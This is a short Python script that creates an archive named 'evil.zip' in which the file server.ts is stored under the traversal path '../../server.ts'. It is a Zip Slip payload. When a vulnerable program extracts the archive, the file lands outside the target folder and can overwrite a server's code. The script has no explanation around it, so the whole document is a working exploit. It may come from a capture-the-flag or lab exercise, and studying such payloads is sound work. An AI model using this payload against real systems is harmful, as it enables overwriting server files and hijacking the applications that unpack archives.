import zipfile
PATH = "../../"

def main():
    zf = zipfile.ZipFile("evil.zip", "w")
    zf.write("server.ts", PATH + "server.ts")
    zf.close()
if __name__ == '__main__':
    main()



